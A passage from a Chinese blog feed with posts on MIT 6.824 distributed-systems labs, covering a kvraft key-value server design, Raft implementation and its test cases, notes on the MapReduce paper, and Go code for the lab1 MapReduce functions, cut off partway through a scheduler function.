compaction在PartA中我们首先需要完善位于kvraft/client.go与kvraft/server.go中的Put，Append，Get三个RPC，Put用于替换数据库中特定键的值，Append用于将值附加到键原先的值上，Get用于获取键的当前值（当一个键不存在时，Append的作用与Put相同） client部分: 第一步是完成client.go中的内容，在client端我们需要编写RPC调用函数，这样client就能通过对应的函数向server发送RPC来进行数据操作。 1234567type Clerk struct &#123; servers []*labrpc.ClientEnd opnum int //give each operation a num to prevent it from being executed many times leaderId int64 mu sync.Mutex clientId int64&#125; 以上是我的clerk结构，除了已经给定的servers变量以外，使用opnum记录使用者发送的每一次命令（Put，Append，Get），这样在server端可以通过opnum来辨别该命令是否已经执行（Append命令的重复执行就会导致数据错误） leaderId用于记录server节点的leader编号，这样就不需要每一次发送RPC时重复迭代寻找leader。 mu用于添加互斥锁。clientId为自己的编号，在lab3A中会出现多个client向server发出请求的情况，每一个client的opnum都是从0开始递增，为了防止它们命令的错乱，所以需要clientId来表示client的编号，然后在server处对每一个client的opnum做维护。 注意点:在raft中当RPC发送失败时会使用一个循环使它的RPC成功之前重复发送该RPC，在client中我也设置了这样的机制，但是这里需要做一些改动，否则会发生死锁 12345ok:=ck.servers[ck.leaderId].Call(&quot;RaftKV.PutAppend&quot;,&amp;args,&amp;reply)for !ok&#123; ck.leaderId=nrand()%(int64(len(ck.servers))) //partition,the server unreachable ok=ck.servers[ck.leaderId].Call(&quot;RaftKV.PutAppend&quot;,&amp;args,&amp;reply)&#125; 在每一次RPC发送失败后，都需要把leaderId使用随机数(或者用循环迭代）的方式改变，与raft不同，这里使client向server发送RPC请求，但是在partition测试中，会出现某几个server断开的情况，此时如果在每次RPC失败后不充值leaderId，会导致不断向断开的server发送请求，而真正的leader却接受不到请求的死锁 Server部分: 第二步我们需要编写server.go中的代码，这一部分主要要完成的内容就是server端的Get和PutAppend的函数，已经对于raft提交的log（也就是Get和Put，Append的请求）的处理。 123456789101112131415type RaftKV struct &#123; mu sync.Mutex me int rf *raft.Raft applyCh chan raft.ApplyMsg commitIndex int commitTerm int maxraftstate int // snapshot if log grows this big applyNum map[int64]int //记录start调用的命令序列号 DB map[string]string applyMsg map[int64](map[int]Msg) applyCheck map[int64]map[int]string killCh chan bool&#125; 1234type Msg struct&#123; command Op index int&#125; PutAppend和Get的RPC处理函数的结构是大致相似的，我的函数流程大致为: 1.调用rf.GetState查看当前server是否leader，如果不是leader就返回 2.查看applyCheck，如果当前applyCheck[clientId][opnum]的值存在的话说明当前请求已经被执行过了，这时我们只要将执行结果直接返回就行 3.调用rf.start(op)将log加入raft（这里的op是自定义结构，具体内容由自己填写)并将start返回的index作为CommandIndex保存 4.设定一个时间（我设置2s），在这一段时间内，不断的循环访问applyMsg[client][opnum]来确认刚才提交的请求是否已经被raft apply并且被server执行。当定时结束后若请求仍未被执行，就将wrongLeader置为true并且返回 5.在得到applyMsg[clientId][opnum]后，将applyMsg中的成员变量command以及index分别与op和CommandIndex做比较（确定apply的log是我们刚才提交的），如果都相同的话就可以访问applyCheck[clientId][opnum]得到答案返回；如果不是全部相同就将wrongLeader置为true并返回 最后是Apply部分的内容，这个函数需要在StartKVServer被调用时就开始并发执行，它用于响应raft提交到applyCh中的log（也就是请求），其大致流程: 1.开启一个循环 for msg:=range kv.applyCh，不断接受applyCh中的log 2.将msg.Command断言为Op类型 （Command是interface{}，需要断言才能将它认定为Op类型使用） 3.查询applyCheck[clientId][opnum]，如果它的值存在说明这个请求已经被执行过，直接continue 4.根据Command.Operation判断请求类型（Get，Put，Append），然后对kv.DB做对应数据操作，如果是Get请求则将结果写入applyCheck[client][opnum]，否则就对applyCheck[client][opnum]写入空串（写入空串和不写不一样） 5.将Command和msg.Index作为Msg类型变量存入applyMsg[clientId][opnum]，用于判断提交和apply的log是否一致 以上部分就是lab3A的主要内容和实现思路，在3A部分中的坑其实不多，按照给定的要求来做基本上不会遇到什么坑，但还是要提醒大家一下，在独写成员变量时最后都加上锁来保险，特别是访问applyCheck，applyMsg，DB这几个图结构的时候，如果不加锁很容易造成同步独写导致程序异常。","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"MIT-6.824-lab2-raft（实验内容+测试用例讲解）","slug":"mit-6-824-raft（实验内容测试用例讲解）","date":"2020-02-14T09:39:59.000Z","updated":"2020-08-30T04:48:00.234Z","comments":true,"path":"2020/02/14/mit-6-824-raft（实验内容测试用例讲解）/","link":"","permalink":"http://yoursite.com/2020/02/14/mit-6-824-raft%EF%BC%88%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E8%AE%B2%E8%A7%A3%EF%BC%89/","excerpt":"","text":"github: https://github.com/wwow1/MIT-6.824（课程实验是按照17年的内容做的） （给大家分享另外一篇关于lab2测试用例的文章，我认为写的很好。https://www.jianshu.com/p/1df5b7227719 ) 前几天终于完成了6.824的lab2，做lab2的时候能明显的感觉到lab2的难度和lab1相比还是有较大提升的，在搜索相关信息的时候也能感觉到，写lab1的blog很多，但写lab2的blog就少得多。写这篇文章主要是给在lab2中遇到困难和瓶颈的同学提供一些思路，还有就是对于实验的测试用例做一个讲解，在lab2中调试占据了实验的很大一部分时间，在调试的过程中如果能够明白测试的内容，也能更加高效的debug。 lab2的任务是根据Raft的论文来实现Raft协议，所以在做lab2之前大家一定要认真的去看Raft的paper，具体的理解Raft的一些机制。对于英语不好的同学也可以参考Raft论文的中文翻译。同时课程主页上也提供了曾经6.824课程助教的博客，博客中提供了许多大家可能犯的错误，在开始实验之前大家务必要花时间去看，这上面的建议和易错点真的非常有用！！！！！ Raft中文翻译:https://github.com/maemual/raft-zh_cn/blob/master/raft-zh_cn.md Part A 第一部分的任务是实现领导选举和心跳机制，这一部分比较简单。实验要求在raft.go中编写你的代码，在raft.go中也提供了不同函数的用途以及目前是否需要填写信息。PartA的内容只需要严格按照Raft论文的Figure2来做就行。 这里首先要完善Raft结构的内容，还有用于RPC调用的AppendEntriesArgs，AppendEntriesReply，RequestVoteArgs，RequestVoteReply结构体，同时要编写RequestVote和AppendEntries的具体内容，前者是用于领导选举的投票，后者是用于心跳，RequestVote在这一部分不需要加入”up to date”的内容，因为PartA未涉及到日志的内容。而AppendEntries目前只用于心跳，所以只需要在被调用时重置election timeout就行了。 在RPC部分完成后，需要完善Make函数(用于初始化一个节点)，同时在每一个节点中设置election timeout，每一个节点一开始都是follower，当固定时间内未收到心跳或未向candidate投票，则由follower转为candidate，同时发起选举，选举结束后确定下一步的状态（在发起选举后的行为在论文中的Figure2中写的非常详细，照着写就行） 测试1：TestInitialElection2A 使用三个节点，首先确认集群中是否由leader存在（不存在则报错），然后获取集群当前的term，在一小段时间后，再次获取集群的term，在此期间没有任何错误发生，所以前后两次的term应该相同（不同则报错） 测试2：TestReElection2A 使用三个节点，首先确定集群中的leader存在（不存在则报错）记为leader1，然后将leader从集群中断开，这时再次确认集群中是否选举出了新的leader（不存在则报错） 使leader1重返集群，这时再次判断集群中的leader是否存在（不存在则报错），记为leader2，然后将leader2以及另一个server从集群中断开，这时集群中目前只有1个节点，且它的身份为follwer，则这时集群中的1个节点无法选举得到leader（如果集群中存在leader则报错） 使leader2重返集群，集群中存在2个节点，则应该存在leader（不存在则报错） Part B 第二部分算是lab2中最复杂的一块，同时也非常容易出错。这一部分的任务是实现添加日志，提交日志的功能。与PartA相同，主要是尽可能地按照Figure2的内容做，但是与PartA不同的地方在于，PartB中存在一些Figure2中没有细说的corner case。 我们首先还是完善RPC部分的内容（因为这一部分的内容相对比较独立，且Figure2描述的很清晰），首先是RPC的结构中要加入与log有关的变量，对于RequestVote的处理，只需要在投票前增加一个“as up to date as me”的判断就行（具体内容看paper5.4.1）对于AppendEntries的处理也是按照Figure2的内容来做就行（这一块有一些小问题在后续的测试讲解部分会说到）。 然后是Start函数的填写，该函数是由客户端调用的，每一次调用Start传入一个command，如果当前函数的处理者不是leader则直接返回，如果是leader则开启一个goroutine向所有follower发送AppendEntries来添加日志条目，注意Start函数不应该等待添加日志条目的过程，而应该快速的返回，所以这里要使用goroutine。 最后，还应该拥有日志的提交功能和应用功能，当某个日志条目（该日志条目必须是在本周期被加入日志中）被复制到过半数的server上时，应该将该日志条目提交，在日志条目提交后，还应该被添加到ApplyCh中（“应用”）。对于这两个功能的实现，我的做法是在一个节点被Make时开启一个goroutine来持续性地检测和Apply条目。在节点被选举为leader时，开启一个goroutine来持续性的检测和commit条目（注意只有leader需要检测并commit，follower们在接受AppendEntries的请求时会根据leader的情况来更新自己的commitIndex） 易错点 1.在修改volatile类的变量时（如commitIndex,lastApplied)，要记得加锁，否则很容易尝试错误且难以发现。（例如Start中将条目加入leader的log时要上锁，不然就会出错）。 2.Start中在RPC发送失败时会重复发送直到成功为止，但要防止出现当前节点已经不是leader但是仍然持续发送AppendEntries的情况。 3.leader发送的RPC请求可能乱序，即先发送的RPC后收到，但后发送的RPC先收到。 4.即使是心跳，也要进行prevLog的一致性检查 5.在prevLog能够正确时，每一次AppendEntries RPC应该要将leader的全部条目（当前传入的）赋给server。添加日志时nextIndex的值只是一个“试探”，而不应该将它作为新增日志的具体下标。当client同时发送5个command给leader时，这五条command使用的nextIndex必定是相同的（nextIndex在AppendEntries返回时才会修改）这种情况下，如果将nextIndex作为下一条新增条目的下标就会造成覆盖。如果不依赖nextIndex，而是在每一次Append调用中都将传入的Log全部更新到server上就不会出问题。 6.在prevLog正确的情况下，如果server的Log长度比AppendEntriesArgs中的Log更长的话，切记不能截断多出的部分。这是由于RPC乱序，含有更多条目的AppendEntries先改变了server的Log。如果这里截断server的Log的话，相当于把正确的Log给删除了，且后续它们可能不会再出现（因为含有它们的AppendEntries已经完成了） 测试3：TestBasicAgree2B 使用5个节点，向集群发送5条命令，查看这五条命令是否被所有节点apply到applyCh中 测试4：TestFailAgree2B 使用3个节点，首先发送一条命令（101），这条命令应该被所有节点接受并apply。 然后将一个server断开，再连续发送4条命令（102，103，104，105）到集群中，这些命令应该被集群中剩下的2个节点接受并apply。 将断开的那个节点恢复，然后发送两条命令（106，107），这两条命令应该被所有节点接受并提交。 （事实上，对于每个节点而言，最终它的日志中都应该包含从101~107的所有命令，即使是曾经从集群中断开也一样） 测试5：TestFailNoAgree2B 使用5个节点，首先发送一条命令（10），每个节点都应接受并apply。 然后将3个follower断开，然后再提交一条命令（20）给集群，这条命令不会被提交。 再将3个follower恢复。再发送一条命令（30），这条命令应该被5个节点都接受并apply，且它的index必须是2或3。 最后再提交一条命令（1000），它也应该被5个节点接受并apply。 （一开始被断开的3个follower之间会选举出一个新leader（称保留在集群中的leader为老leader），在它们返回集群时，两个leader将会比对各自的term，term高的人成为集群最终的leader，如果新leader的term大（不发生故障情况），那么命令（30）的index应该是2；如果老leader的term大，那么命令（30）的index应该是3） 测试6：TestConcurrentStarts2B 使用3个节点，连续快速地发送五个命令（100~104）到集群中，然后查看它们被apply的顺序和Start时返回的次序是否相同，简而言之就是它们能否被顺序提交。 测试7：TestRejoin2B 使用3个节点，设它们为A，B，C，假设A最先成为leader，向集群提交了第一个命令（101），它应该被所有节点接收并apply 断开A，然后向A发送3个命令（102，103，104），由于只有A得到了这3个命令，所以它们不会被提交 A断开后，B与C中选出一个新的leader，这里假设是B，向B发送命令（103），B与C都将接受并apply它 断开B，恢复A，这时在集群中的是A和C，由于选举限制，C会成为leader（必定），然后向C发送命令（104），A与C都会接受并apply它，同时C会对A的日志进行调整。（这时A的日志内容为{101，103，104}） 恢复B，最后发送一条命令（105）到集群中，它将所有节点接受并apply 测试8：TestBackup2B （这一个测试的命令内容都由随机数生成，但是在debug的时候建议把它们改成固定的数值，否则由于生成随机数都非常大，在打印日志的时候会眼花缭乱） 使用5个节点，假设为A，B，C，D，E，假设A先成为leader，首先发送一条命令（随机数生成，但这里使用我指定的数方便说明），命令（0） 断开C，D，E，向保留在集群中的A与B发送50条命令（-1~-50），由于只有两个节点接受到这50条命令，所以它们不会被提交 将A，B断开，C，D，E恢复，假设恢复后C成为了新的leader，向C，D，E发送50条命令（1~50），这些命令会被C，D，E提交 将D断开，向剩下的C，E发送50条命令（-51~-100），只有两个节点收到这50条命令，所以它们不会被提交 将剩下的节点都断开，恢复A，B，D，然后D会成为leader（选举限制），向A，B，D发送50条命令（51~100），这些命令会被A，B，D提交 将所有节点连接到集群中，发送一条命令（200），它会被全部节点提交 易错情况: 在Rejoin和Backup都可能出现一种很麻烦的情况。以Backup为例，在最后所有节点恢复后，假设A为leader（由于选举限制，只有ABD可能成为leader），这时log[A]={0，1，2，…，50，51，52，…，100}，那么它的commitIdex=101 在C恢复时，log[C]={0，1，2…，50，-51，-52，…，-100}，它的commitIndex=51 C在恢复后会接受到A发送的第一次心跳(不会把leader的log给follower，只会检查prevlog并且更新commitIndex），由于保存在A中的nextIndex[C]&lt;51（即使不是，也会因为nextIndex一直回退，最终变成这样），则prevLog检测正确，C会根据A的commitIndex更新自己的commitIndex，然后C的commitIndex=101 之后C就会将本不应该被提交的命令（-50~-100）提交，从而造成“commit index=52 server=C -51 != serverA 51”的错误 造成这个错误最大的原因就是对于重返集群的节点，心跳只会检测prevLog而不会检测整个Log是否与当前leader同步（因为心跳不会传入Log信息），但是心跳又会更新commitIndex（如果在心跳中去除这个功能，前面的测试会出错，造成“one failed to reach argeement”），所以造成了错误。 一开始想到既然是心跳导致的commitIndex错误更新，那么在心跳中不做commitIndex的更新，只在AppendEntryRPC中更新就行啦！但实际上不行…因为对于最后一条log entry而言，它在被发送给follower后，还需要更新commitIndex才能够apply，但是如果我们只在AppendEntryRPC中更新commitIndex的话，这最后一条log entry的commitIndex就不可能被更新（它是最后一条entry，不会再有AppendEntryRPC发送给follower了） 我的解决方法是对重返集群的节点增加一个outdate标记，当outdate标记为真时 1234//outdate==trueif prevLogIndex &gt; rf.commitIndex&#123; rf.commitIndex=min(min(prevLogIndex,args.LeaderCommit),rf.lastLogIndex)&#125; 造成错误的原因就是在不一致的条件下更新commitIndex，而在这里我们能保证一致性的就是prevLogIndex及其之前的log，那么我们就用它来更新commitIndex。另一方面，由于HeartBeat会不断改变传入的prevLogIndex的值，所以即使在outdate=true的情况下，follower的commitIndex也会逐步跟上leader（但是效率较低） outdate为假时，就跟原先一样 12//outdate==falserf.commitIndex=min(rf.lastLogIndex,args.LeaderCommit) 那么如何检测重返集群的节点呢？我的做法分为两方面，第一是当节点发现自己的term低于其他节点时，就执行outdate=true；第二是当节点的leaderId=-1（这种情况表示它不知道当前leader是谁），也执行outdate=true 上述做法可能会将一直在集群中的节点也打上outdate标记，但这并不影响，在outdate标记存在时，follower也可以通过prevLogIndex和leader.commitIndex来更新自己的commitIndex appendEntriesRPC 测试9：TestCount2B 这个测试主要是要求RPC的使用次数不能太多，只要election timeout正确，不产生太多选票瓜分，并且心跳间隔符合要求就能通过。 Part C 集群中的节点随时可能crash, 所以我们将一些数据: Log，currentTerm， votedFor，主要编写readPersist和persist方法。在Make方法被调用时立即恢复之前持久化保存的数据。 在Log，currentTerm，votedFor这几个需要持久化的数据改变时调用persist方法更新数据，在Make方法中使用readPersist读取持久化的数据 后续几个关于Figure8和Unreliable的测试主要是在2B的基础上完善逻辑，如果之前写的程序逻辑没问题，其实就可以直接通过。 唯一要注意的一点是，在AppendEntryRPC中需要加入一个优化，否则有一个测试点会一直卡着过不去。 详细优化情况参照https://thesquareplanet.com/blog/students-guide-to-raft/ 这是MIT6.824某个助教写的guide，里面记录了一些大多数学习者都会遇到的corner case及其解决方法，大家如果在哪里卡住了可以参照一下 为了大家方便，我直接将其中有关2C的优化点给截图下来。 LAB 2C 有关AppendEntryRPC内部的优化点 当我们在AppendEntryRPC中发现Leader传入的prevLog和follower冲突时，我们就会返回，并在leader中回退prevLogIndex，我们原先的做法就是一次回退一步；但是这样会比较慢，如果leader和follower的Log之间差异过大的话，我们需要发送多次AppendEntry来回退prevLogIndex。为了加速回退过程，我们在每次回退的时候，可以回退到上一个term提交的log处，具体的处理方式在上图中说的比较详细。 总结 在做lab2的时候才真正感受到了分布式系统debug真是太痛苦了，我这个菜鸡就只能用print把状态信息打出来慢慢分析，甚至有些错误是概率性发生的，这跟单机调试完全不一样。但是在完成了这个实验之后也很有成就感。（虽然程序还有很多date race，以后有时间在改把= =）","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"Mapreduce读书笔记","slug":"mapreduce读书笔记","date":"2020-01-23T11:19:57.000Z","updated":"2020-08-30T04:00:10.492Z","comments":true,"path":"2020/01/23/mapreduce读书笔记/","link":"","permalink":"http://yoursite.com/2020/01/23/mapreduce%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"1.介绍 MapReduce是一个用于处理大数据集的编程框架，它能够使没有任何分布式开发经验的程序员也能够使用大型分布式系统来进行数据处理。对于大多数使用者而言，他们只需要根据自己的需要编写MapReduce中的map函数和reduce函数就能够很容易的实现大规模并行化计算，同时MapReduce模型也提供了一定程度的错误处理。 2.编程模型 MapReduce编程模型的原理是：利用一个输入key/value pair集合来产生一个输出的key/value pair集合。MapReduce库的用户用两个函数表达这个计算：Map和Reduce。 用户编写的map函数得到一个输入的key/value pair，然后产生一系列中间的key/value pair。然后Mapreduce库会将所有具有相同key值的中间value值集合起来传递给reduce函数 用户编写的reduce函数得到一个输入的key值和一个与key值向对应的value值的集合。reduce函数将这些值合并起来，产生一个较小的value值的集合作为结果（每次reduce调用一般只产生0或1个输出value值) 3.实现 3-1执行流程 1.MapReduce库会将输入数据划分为M份（每份一般为16~64MB，可设置参数调整）然后将会把程序复制到集群中的每一台机器中 2.在所有机器中，会存在一个Master，而其他机器都被称为worker，Master会为worker分配任务。共有M个map任务以及R个reduce任务需要被分配。master将会为每个空闲的worker分配一个map任务或reduce任务。（worker在一个时刻只能执行一个任务，但每个worker一般需要顺序的执行多个任务） 3.被分配map任务的worker（称之为 map worker）将会读取对应的输入文件块，它从输入文件块中提取出一个key-value pair集合，并且将这个集合传入用户定义的Map函数。由Map函数产生的中间key-value pair集合将会暂时缓存在内存中 4.缓存在内存中的中间key-value pair会周期性地被分区函数划分为R份，并将其写入到Map worker的本地磁盘中。这些中间key-value pair的存储地址与长度将会被发送给Master，Master在之后的过程中需要将这些数据的地址发送给reduce worker 5.当一个worker被Master分配执行reduce任务后（称它为reduce worker），它将通过RPC（远程过程调用）读取存储在map worker磁盘上的中间key-value pair，在将这些数据全部读入后，reduce worker会将这些中间key-value pair根据key值进行一次排序，这样能够便于得到拥有相同key值的中间key-value pair。 6.在排序后，reduce worker将传递一个key值以及一个与该key值相对应的value集合（这里的key和value都是map函数生成的中间key-value pair中的内容）给用户定义的Reduce函数，Reduce函数的输出将被添加到最终输出文件中（由全局文件系统管理，而不是像map过程一样保存在本地) 7.当所有map任务和reduce任务完成，Master将唤醒用户程序，这时，MapReduce的调用就结束了。 3-2 Master的数据结构 Master中存储了每个map任务以及reduce任务的状态(闲置，处理中，完成)以及每一个worker机器的状态（是否处于空闲状态） 同时，Master还需要保存Map任务产生的中间key-value pair的保存地址，对于每一个已经完成的map任务而言，Master需要保存该map任务存储数据的R个地址和大小（每一个map任务的输出内容被划分为R份保存)这些被Master保存的地址信息将会被发送到reduce worker 4.容错 1.worker故障 Master会周期性的ping每一个worker，如果在确定的时间内，被ping的worker没有响应则认为这个worker故障了。因为map任务的输出结果是保存在本地的，如果该worker故障了，后续的reduce worker将无法获取需要的中间文件，所以所有被故障worker执行过的map任务需要交由其他worker再次执行。而reduce任务则没有这样的要求，它的输出结果并不是保存在本地。对于故障worker正在执行的任务而言，只需要将这个任务交由其他worker执行就可以了。 2.Master故障 周期性的将Master节点的信息保存，如果Master故障了，只需要从内存中copy出一个新的Master就行了。但是在论文中介绍，对于Master节点的故障，原作者采用的是直接结束程序的方法来向使用者反应错误。 5.数据存储 （在论文发表时)网络带宽是较为稀缺的资源，也最容易成为MapReduce的性能瓶颈，所以我们希望能够尽量少的使用网络资源，转而尽量使用本地读取的方式提高程序的性能。MapReduce将输入数据划分为多个64MB的blocks，然后将这些blocks以及它们的复制（一般复制3份）保存在构成集群的机器上。MapReduce会将map任务尽量分配给具有对应输入数据(或是存有输入数据复制）的机器上，如果这一点无法做到，它也会将map任务分配到与存有对应输入数据处于同一个交换网络中的其他机器上，尽可能的节约网络带宽资源。 6.任务粒度 我们将map阶段分为M份，reduce阶段分为R份。事实上M和R的数值要远大于集群中的机器数量。对于每一个机器而言，它需要执行多个任务来保证负载均衡以及加速在机器故障时系统的恢复速度。 对于M和R的取值也是有一定标准的，R的取值一般由用户指定，因为每一个reduce任务都会生成一个独立的输出文件。同时在实际的使用时，我们也会选取合适的M使得每一个任务都处理大约16~64MB的数据（这样上述的本地存储优化策略才最有效)，对于R而言，一般将R值设置为集群中worker机器数量的一个小的倍数值。 7.备用任务 在map阶段以及reduce阶段即将完成时，时常会出现在执行最后几个任务时消耗了大量时间导致整个程序的执行时间被拖长的情况，这可能由多种原因引起，如磁盘出错。所以MapReduce设置了备用任务，在map阶段或reduce阶段即将结束时，Master会向部分空闲的worker发送还未完成的任务（会导致最后几个未完成的任务由多个worker共同执行），在多个执行相同任务的worker中，只要由一个完成了该任务，则Master视为该任务完成。这样大大提高了MapReduce的执行效率。 8.使用技巧 1.分区函数：它被用于划分map函数生成的中间key-value pair，对于缺省的分区函数，会默认使用hash的方法划分中间数据，但用户也可以自己编写分区函数来指定具体的数据划分方式。 2.顺序保证：在给定的划分中，中间key-value pair将会按照key值递增的方式排序。 3.合并函数：它的作用是在map worker本地先进行一次中间数据的合并，类似于reduce的作用，合并函数和reduce函数最大的区别是合并函数的输出结果是作为输出文件传递给reduce函数进行后续的处理，而reduce函数的输出会被写入到最终输出文件中。 （中间略去了几点我没怎么使用到，并且理解不太好的内容） 4.跳过损坏记录：有时代码中出现了bug导致Map或Reduce函数在执行过程中出错，导致整个MapReduce无法完成。正常来说我们需要先修复bug再运行程序。但有时找出bug需要耗费大量的时间，另一方面也许这个bug在当前阶段是可以接受的。这时MapReduce提供了一种执行模式，在这个模式下MapReduce会检测代码那些部分出错了，并且跳过这一步部分暂不处理。 在执行Map或Reduce操作前，MapReduce库通过全局变量保存记录序号（我的理解应该就是代码的行列数？）如果用户程序触发了错误，消息处理函数会“用最后一口气”向master发送处理的最后一条记录的序号。当master发现在某个记录出多次失败时，就认为这条记录需要被跳过，在下次重新执行这个任务时会跳过这条记录 5.本地执行：在分布式系统中调试bug时非常困难的，MapReduce提供了本地版本的库，可以使整个MapReduce过程都在本地计算机上顺序执行，这样用户可以在本地上控制MapReduce操作的执行，能够更好的调试程序。 6.状态信息：Master可以显示一组状态信息，用户可以监控各种信息。包括了计算执行的进度，例如完成的任务数，正在处理的任务数，处理的百分比等。更进一步的，最顶层的状态页面还会显示那些worker失效了，并显示它们失效时执行的Map和Reduce任务，这些信息在debug时也会提供很大帮助。 7.计数器：MapReduce库使用计数器统计不同事件的发生次数，例如以及处理的单词数，被索引的文档数等。 （论文之后的内容主要是MapReduce的性能分析以及一些相关工作的介绍，对于目前的我而言这些内容没有太大意义，并且我认为这些内容直接阅读原论文效果会更好，所以就不整理出来了。） 9.总结 MapReduce作为一个编程框架对于没有大规模分布式系统开发经验的使用者是非常友好的，它向使用者隐去了底层分布式系统的细节，用户只需要根据自己的需要填写Map函数和Reduce函数就能够直接开始进行大规模数据的处理，同时，MapReduce也提供了一定的性能优化以及基本的容错机制。对于我这样的分布式系统学习者而言，MapReduce也是一个很好的学习资料能够让我们理解一个分布式系统的运行过程以及构建系统中需要考虑的因素。","categories":[{"name":"mit6.824","slug":"mit6-824","permalink":"http://yoursite.com/categories/mit6-824/"}],"tags":[]},{"title":"MIT-6.824 lab1-mapreduce","slug":"mit6-824-lab1-mapreduce","date":"2020-01-22T14:34:30.000Z","updated":"2020-08-30T04:43:34.748Z","comments":true,"path":"2020/01/22/mit6-824-lab1-mapreduce/","link":"","permalink":"http://yoursite.com/2020/01/22/mit6-824-lab1-mapreduce/","excerpt":"","text":"github: https://github.com/wwow1/MIT-6.824 最近几天开始学习MIT6.824的分布式系统课程，现在刚完成了lab1部分的内容，就跟大家分享一下lab1的内容以及一些坑。总体而言，lab1的内容还是相对简单的，但是由于我对于go语言较为陌生，对于go的标准库也不熟悉，所以在语言这方面踩了很多坑。 前两个部分我们将在sequential模式下顺序执行程序。而在后面几个部分的实验中将在distributed模式下并发执行。 Part I: Map/Reduce input and output 第一部分的任务是要我们填写在common_map.go中的doMap()函数以及common_reduce.go中的doReduce()函数。 doMap()函数首先读入输入文件inFile的内容，再将文件名以及文件内容作为输入调用Map函数，然后创建R(在文件中为nReduce)个中间文件用于保存Map函数输出的中间键值对，这R个文件的文件名通过函数reduceName生成。最后通过调用ihash函数将所有中间键值对按key值分配到R个文件中(注意这里要求使用json格式写入) doReduce()函数首先要读入对应的M(在文件中为nMap)个中间文件的数据，然后对这些数据按照它们的key值进行排序，将具有相同key值的键值对集合起来作为参数调用reduce函数，最后将每一个reduce函数的输出写入输出文件outFile中(读出和写入都要注意json格式) 12345678910111213141516171819202122232425262728293031323334func doMap( jobName string, // the name of the MapReduce job mapTaskNumber int, // which map task this is inFile string, nReduce int, // the number of reduce task that will be run (&quot;R&quot; in the paper) mapF func(file string, contents string) []KeyValue,) &#123; data,err:=ioutil.ReadFile(inFile) if err!=nil &#123; fmt.Println(&quot;File reading error&quot;,err) return &#125; immediaKV :=mapF(inFile,string(data)) FileGroup := make([]*json.Encoder, nReduce) for i:=0;i&lt; nReduce;i++ &#123; name:=reduceName(jobName,mapTaskNumber,i) file,err:=os.Create(name) if err!=nil&#123; fmt.Println(&quot;File create error&quot;) return &#125;else&#123; defer file.Close() &#125; enc := json.NewEncoder(file) FileGroup[i]=enc &#125; for _,kv:=range(immediaKV) &#123; err:=FileGroup[ihash(kv.Key)%nReduce].Encode(&amp;kv) if err!=nil &#123; fmt.Println(&quot;File write error&quot;) return &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041func doReduce( jobName string, // the name of the whole MapReduce job reduceTaskNumber int, // which reduce task this is outFile string, // write the output here nMap int, // the number of map tasks that were run (&quot;M&quot; in the paper) reduceF func(key string, values []string) string,) &#123; KVmap:=make(map[string]([]string)) for i:=0;i&lt;nMap;i++ &#123; name:=reduceName(jobName,i,reduceTaskNumber) file,_:=os.Open(name) dec:=json.NewDecoder(file) for &#123; var tmp KeyValue err:=dec.Decode(&amp;tmp) if err!=nil &#123; break &#125; KVmap[tmp.Key]=append(KVmap[tmp.Key],tmp.Value) &#125; file.Close() &#125; var KeySort []string for k,_:=range(KVmap)&#123; KeySort=append(KeySort,k) &#125; sort.Strings(KeySort) output,err:=os.Create(outFile) if err!=nil &#123; fmt.Println(&quot;error&quot;) return &#125; enc:=json.NewEncoder(output) for _,v:=range(KeySort) &#123; err = enc.Encode(KeyValue&#123;v, reduceF(v, KVmap[v])&#125;) if err!=nil &#123; fmt.Println(&quot;error&quot;) return &#125; &#125; output.Close() Part II: Single-worker word count 第二部分的任务是编写位于main/wc.go文件中的mapF()和reduceF()函数，要求能够对输入文件的每一个单词的出现次数进行统计。 mapF()函数输入的key值是要处理文件的文件名，value值是文件内容，只需要调用strings.FieldsFunc函数将value值划分为一个单词数组，最后将单词数组改写为KeyValue数组。(这里提示一下，FieldsFunc函数的划分使用 isLetter函数而不是 isSpace函数） reduceF()函数则非常简单，将输入的value数组使用strconv库转换为整形进行累加，累加完毕后再将数字转换为字符串返回。 123456789101112131415161718func mapF(filename string, contents string) []mapreduce.KeyValue &#123; var ans []mapreduce.KeyValue var keyList []string=strings.FieldsFunc(contents,func(r rune) bool &#123;return !unicode.IsLetter(r)&#125;) for _,key:=range(keyList) &#123; ans=append(ans,mapreduce.KeyValue&#123;key,&quot;1&quot;&#125;) &#125; return ans&#125;func reduceF(key string, values []string) string &#123; var ans int=0 for _,times:=range(values) &#123; tmp,_:=strconv.Atoi(times) ans+=tmp &#125; return strconv.Itoa(ans)&#125; Part Ⅲ：Distributing MapReduce tasks 第三部分要求完成mapreduce/schedule.go中的schedule()函数，schedule()函数的任务是向每一个worker并行的分发任务(在map阶段是map任务，reduce阶段就是reduce任务)，要注意一般而言任务的数量是多于worker的数量的，这意味着每一个worker都要执行多个任务，但在某一个时刻，每个worker都只能执行一个任务，这就需要schedule函数来规划具体的任务分配。schedule函数通过call函数（定义在mapreduce/common_rpc.go）来向不同的worker分配任务。同时只有在全部任务执行完毕时schedule函数才会返回。（Part Ⅲ和Part Ⅳ的代码一并给出) Part Ⅳ：Handling worker failures 第四部分要求对mapreduce进行简单的错误处理，在第三部分的基础上改进schedule函数，要求能够对于worker出错的情况进行处理。处理机制比较简单，只需要将出错的worker排出工作列表，同时将执行失败的任务分发给其他worker再次执行就可以了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556func schedule(jobName string, mapFiles []string, nReduce int, phase jobPhase, registerChan chan string) &#123; var ntasks int var n_other int // number of inputs (for reduce) or outputs (for map) switch phase &#123; case mapPhase: ntasks = len(mapFiles) n_other = nReduce case reducePhase: ntasks = nReduce n_other = len(mapFiles) &#125; fmt.Printf(&quot;Schedule: %v %v tasks (%d I/Os)\\n&quot;, ntasks, phase, n_other) var completedTask int=0 var Taskchan=make(chan int,ntasks) for i:=0;i&lt;ntasks;i++&#123; //用管道当作队列来储存待处理的任务号 Taskchan&lt;-i &#125; var FirstTaskMark bool=false var wg sync.WaitGroup var closeMark bool=false for addr:=range(registerChan) &#123; if(addr==&quot;close&quot;)&#123; //任务结束 break &#125; wg.Add(1) go func(v string) &#123; //要传入参数，否则会出现在同一个worker上执行多个任务的情况 